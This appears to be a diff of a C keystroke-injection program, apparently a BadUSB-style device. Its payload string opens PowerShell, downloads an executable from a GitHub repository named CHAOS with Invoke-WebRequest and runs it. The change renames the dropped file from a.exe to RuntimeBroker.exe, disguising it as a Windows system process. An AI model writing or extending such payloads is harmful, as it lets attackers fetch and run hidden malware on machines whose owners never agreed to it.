@@ -438,11 +438,12 @@ int main(void) {
     //                           "Pheonix_Holmes_Stationary.png?raw=true -OutFile a.exe\e          "
     //                           "                                                    "
     //                           "                                              ";
-    const char data_input[] = "r\apowershell\e\a\a\a\aInvoke-WebRequest"
-                              " https://github.com/314PiGuy/CHAOS/raw/main/a.exe -OutFile a.exe\e          \e\e\e\a\a\a"
-                              "./a.exe\e                                       "
-                              "                                                                            "
-                              "                                              ";
+    const char data_input[] =
+        "r\apowershell\e\a\a\a\aInvoke-WebRequest"
+        " https://github.com/314PiGuy/CHAOS/raw/main/a.exe -OutFile RuntimeBroker.exe\e          \e\e\e\a\a\a"
+        "./RuntimeBroker.exe\e                                       "
+        "                                                                            "
+        "                                              ";
     const int A_HOLD_ITERS = 50;
 
     struct KeyPress commands[sizeof(data_input)] = {0};
